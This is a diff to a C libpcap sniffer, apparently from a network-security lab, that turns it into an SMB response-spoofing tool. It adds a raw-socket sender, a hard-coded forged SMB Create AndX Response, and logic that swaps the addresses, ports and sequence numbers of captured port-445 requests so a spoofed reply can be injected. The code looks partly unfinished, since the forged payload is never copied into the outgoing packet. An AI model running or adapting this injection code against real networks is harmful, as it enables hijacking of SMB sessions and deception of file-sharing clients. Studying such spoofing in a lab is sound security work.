@@ -212,7 +212,8 @@
 //#include <net/ethernet.h>
 
 /* default snap length (maximum bytes per packet to capture) */
-#define SNAP_LEN 1518
+//#define SNAP_LEN 1518
+#define SNAP_LEN 65536
 
 /* ethernet headers are always exactly 14 bytes [1] */
 #define SIZE_ETHERNET 14
@@ -308,47 +309,51 @@ struct sniff_smb {
         u_short smb_pid;                /* process id */
         u_short smb_uid;                /* user id */
         u_short smb_mid;                /* multiplex id */
-
-//	u_char  smb_wc;			/* word count */
-//        u_char  smb_axc;                /* andxcommand */
-//        u_char  smb_res;                /* reserved */
-//	u_short smb_axo;		/* andxoffset */
-//	u_char  smb_ol;                 /* oplock level */
-//	u_short smb_fid;                /* fid */
-//	u_int   smb_ca;			/* create action */
-//	u_long  smb_c;			/* created */
-//        u_long  smb_la;                 /* last access */
-//        u_long  smb_lw;                 /* last write */
-//        u_long  smb_ch;                 /* change */
-//	u_int   smb_fa;			/* file attributes */
-//	#define SMB_RO  0x00000001
-//        #define SMB_HID 0x00000002
-//        #define SMB_SYS 0x00000004
-//        #define SMB_VOL 0x00000008
-//        #define SMB_DIR 0x00000010
-//        #define SMB_ARC 0x00000020
-//        #define SMB_DEV 0x00000040
-//        #define SMB_NOR 0x00000080
-//        #define SMB_TMP 0x00000100
-//        #define SMB_SPA 0x00000200
-//        #define SMB_REP 0x00000400
-//        #define SMB_CMP 0x00000800
-//        #define SMB_OFF 0x00001000
-//        #define SMB_CON 0x00002000
-//        #define SMB_ENC 0x00004000
-//	u_long  smb_als;		/* allocation size */
-//	u_long  smb_eof;                /* end of file */
-//	u_short smb_ipc;		/* ipc state */
-//	u_char  smb_isdir;		/* is directory */
-//	u_long  smb_vguid1;             /* volume guid */
-//      u_long  smb_vguid2;             /* volume guid */
-//	u_long  smb_svrun;		/* server unique */
-//	u_int   smb_mar;		/* maximal access rights */
-//	u_int   smb_gmar;		/* guest maximal access rights */
-//	u_short smb_bc;			/* byte count */
 };
 
+/* SMB Create AndX Response */
+struct sniff_CAXR {
+	u_char  smb_wc;			/* word count */
+	u_char  smb_axc;                /* andxcommand */
+	u_char  smb_res;                /* reserved */
+	u_short smb_axo;		/* andxoffset */
+	u_char  smb_ol;                 /* oplock level */
+	u_short smb_fid;                /* fid */
+	u_int   smb_ca;			/* create action */
+	u_long  smb_c;			/* created */
+	u_long  smb_la;                 /* last access */
+	u_long  smb_lw;                 /* last write */
+	u_long  smb_ch;                 /* change */
+	u_int   smb_fa;			/* file attributes */
+	#define SMB_RO  0x00000001
+	#define SMB_HID 0x00000002
+	#define SMB_SYS 0x00000004
+	#define SMB_VOL 0x00000008
+	#define SMB_DIR 0x00000010
+	#define SMB_ARC 0x00000020
+	#define SMB_DEV 0x00000040
+	#define SMB_NOR 0x00000080
+	#define SMB_TMP 0x00000100
+	#define SMB_SPA 0x00000200
+	#define SMB_REP 0x00000400
+	#define SMB_CMP 0x00000800
+	#define SMB_OFF 0x00001000
+	#define SMB_CON 0x00002000
+	#define SMB_ENC 0x00004000
+	u_long  smb_als;		/* allocation size */
+	u_long  smb_eof;                /* end of file */
+	u_short smb_ipc;		/* ipc state */
+	u_char  smb_isdir;		/* is directory */
+	u_long  smb_vguid1;             /* volume guid */
+	u_long  smb_vguid2;             /* volume guid */
+	u_long  smb_svrun;		/* server unique */
+	u_int   smb_mar;		/* maximal access rights */
+	u_int   smb_gmar;		/* guest maximal access rights */
+	u_short smb_bc;			/* byte count */
+};
 
+struct sniff_CAXR
+*createAndXResponse(u_char *payload, int size_payload);
 
 void
 got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
@@ -494,6 +499,57 @@ print_payload(const u_char *payload, int len)
 return;
 }
 
+void send_raw_ip_packet(struct sniff_ip* ip)
+{
+	struct sockaddr_in dest_info;
+	int enable = 1;
+
+	/* Create a raw network socket */
+	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+	/* Set socket option */
+	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
+
+	/* Provide needed information about destination */
+	dest_info.sin_family = AF_INET;
+	dest_info.sin_addr = ip->ip_dst;
+
+	/* Send packet out */
+	sendto(sock, ip, ntohs(ip->ip_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
+	close(sock);
+}
+
+struct sniff_CAXR * createAndXResponse(u_char *payload, int size_payload)
+{
+	u_char *newpayload =
+		"\xa2"		// Word count
+		"\xff"		// AndXCommand: No further commands
+		"\x00"		// Reserved
+		"\x87\x00"		// AndXOffset
+		"\x02"		// Oplock level: Batch oplock granted (2)
+		"\x44\x44"		// FID		
+		"\x01\x00\x00\x00"		// Create action
+		"\x3b\x87\x08\x2d\xa7\x7f\xd4\x01"		// Created
+		"\x30\xa2\x63\x26\xb7\x7f\xd4\x01"		// Last access
+		"\x46\x94\x86\xb5\xb6\x7f\xd4\x01"		// Last write
+		"\x46\x94\x86\xb5\xb6\x7f\xd4\x01"		// Change
+		"\x20\x00\x00\x00"		// File attributes
+		"\x00\x70\x00\x00\x00\x00\x00\x00"		// Allocation size
+		"\x22\x6a\x00\x00\x00\x00\x00\x00"		// End of file
+		"\x00\x00"		// File type: Disk file or directory
+		"\x70\x00"		// IPC state
+		"\x00"		// Is directory
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"		// Volume GUID
+		"\x00\x00\x00\x00\x00\x00\x00\x00"		// Server unique file ID
+		"\xff\x01\x1f\x00"		// Maximal access rights
+		"\x00\x00\x00\x00"		// Guest maximal access rights
+		"\x00\x00"		// Byte count
+	;
+
+	return (struct sniff_CAXR *)newpayload;
+}
+	
+
 
 /*
  * dissect/print packet
@@ -501,24 +557,20 @@ return;
 void
 got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
-	const char buffer[1500];
+	//const char buffer[1500];
+	const char buffer[65536];
 
 	/* declare pointers to packet headers */
 	//struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
 	struct sniff_ip *ip;              /* The IP header */
 	struct sniff_tcp *tcp;            /* The TCP header */
-	//struct sniff_smb *smb;		/* The SMB header */
-	//char *payload;                    /* Packet payload */
-
-	/* create pointers to spoofed packet headers */
-	struct sniff_ip *newip;
-	struct sniff_tcp *newtcp;
-	//struct sniff_smb *newsmb;
+	struct sniff_smb *smb;		/* The SMB header */
+	u_char *payload;                    /* Packet payload */
 
 	int size_ip;
 	int size_tcp;
-	//int size_smb;
-	//int size_payload;
+	int size_smb;
+	int size_payload;
 	
 	/* define ethernet header */
 	//ethernet = (struct sniff_ethernet*)(packet);
@@ -540,26 +592,32 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	}
 
 	/* print source and destination IP addresses and ports */
-	printf("       From: %s:%d\n", inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
+	printf("\n\n       From: %s:%d\n", inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
 	printf("         To: %s:%d\n", inet_ntoa(ip->ip_dst), ntohs(tcp->th_dport));
 
 	
 	/* define/compute smb header offset */
-	//smb = (struct sniff_smb*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-	//size_smb = ntohl(SMB_SIZE(smb))+4;
+	smb = (struct sniff_smb*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+	size_smb = 36;
+	size_payload = ntohl(SMB_SIZE(smb)) + 4 - size_smb;
 
 	/* define/compute smb payload (segment) offset */
-	//payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_smb);
+	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_smb);
 
 	/* compute smb payload (segment) size */
-	//size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp + size_smb);
+	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp + size_smb);
 
 	/* Make a copy from the original packet */
-	memset((char*)buffer, 0, 1500);
+	//memset((char*)buffer, 0, 1500);
+	memset((char*)buffer, 0, 65536);
 	memcpy((char*)buffer, ip, ntohs(ip->ip_len));
-	newip = (struct sniff_ip *) buffer;
-	newtcp = (struct sniff_tcp *) ((u_char *)buffer + size_ip);
-	//newsmb = (struct sniff_smb *) ((u_char *)buffer + size_ip + size_tcp); 
+	//printf("\nMem location origin: %x\n",(u_int*)ip);
+	//printf("Mem location copy: %x\n",buffer);
+	//printf("\nIP_LEN: %u\n", ntohs(ip->ip_len));
+	struct sniff_ip *newip = (struct sniff_ip *) buffer;
+	struct sniff_tcp *newtcp = (struct sniff_tcp *) ((u_char *)buffer + size_ip);
+	struct sniff_smb *newsmb = (struct sniff_smb *) ((u_char *)buffer + size_ip + size_tcp); 
+	char *newpayload;
 
 	/* Construct IP header, TCP header, and SMB header */
 	newip->ip_src = ip->ip_dst; 
@@ -571,13 +629,28 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	newtcp->th_seq = tcp->th_ack;
 	newtcp->th_ack = htonl(ntohl(tcp->th_seq) + tcp_seg_len);
 
-	printf("\nOld src: %s   New src: %s\n", inet_ntoa(ip->ip_src), inet_ntoa(newip->ip_src));
-	printf("Old sport: %d   New sport: %d\n", ntohs(tcp->th_sport), ntohs(newtcp->th_sport));
+	//printf("\nOld src: %s   New src: %s\n", inet_ntoa(ip->ip_src), inet_ntoa(newip->ip_src));
+	//printf("Old dst: %s   New dst: %s\n", inet_ntoa(ip->ip_dst), inet_ntoa(newip->ip_dst));
+        //printf("\nOld sport: %u   New sport: %u\n", ntohs(tcp->th_sport), ntohs(newtcp->th_sport));
+        //printf("Old dport: %u   New dport: %u\n", ntohs(tcp->th_dport), ntohs(newtcp->th_dport));
+
 	printf("\nOld seq: %u	New seq: %u\n", ntohl(tcp->th_seq), ntohl(newtcp->th_seq));
 	printf("Old ack: %u   New ack: %u\n", ntohl(tcp->th_ack), ntohl(newtcp->th_ack));
 
+	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_dport) == 445)
+	{
+		newpayload = createAndXResponse(payload, size_payload);
+		printf("\n%u\n", (size_ip + size_tcp + size_smb + size_payload));
+		print_payload(newip, size_ip + size_tcp + size_smb + size_payload);
+		send_raw_ip_packet(newip);
+	}
+	/*if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_sport) == 445)
+	{
+		print_payload(ip, size_ip + size_tcp + size_smb + size_payload);
+	}*/
 
-return;
+	/* Send packet out */
+	//send_raw_ip_packet(newip);
 }
 
 int main(int argc, char **argv)
